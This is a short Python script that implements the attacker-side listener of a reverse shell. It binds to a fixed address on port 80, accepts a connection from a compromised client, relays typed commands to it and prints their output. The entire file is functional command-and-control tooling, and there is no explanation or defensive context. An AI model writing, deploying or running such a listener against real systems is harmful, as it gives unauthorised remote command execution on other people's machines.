import socket

HOST = "172.16.42.137"
PORT = 80

def listen():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    s.bind((HOST, PORT))
    s.listen(20)

    print(f'[+] Listening on port: {PORT}')
    conn, addr = s.accept()

    print(f'[+] Client connected: {addr}')

    while True:
        command = input('Shell> ')
        
        if 'terminate' in command:
            conn.send('terminate'.encode())
            print('[+] Connection closed')
            conn.close()
            break
        
        try:
            conn.send(command.encode())
            print(conn.recv(4096).decode())
        except BrokenPipeError as bre:
            print('[-] Client accidentally disconnected')
            exit(1)
        except KeyboardInterrupt as ke:
            print('[+] Exiting ...')
            exit(0)
    
def main():
    listen()

if __name__ == "__main__":
    main()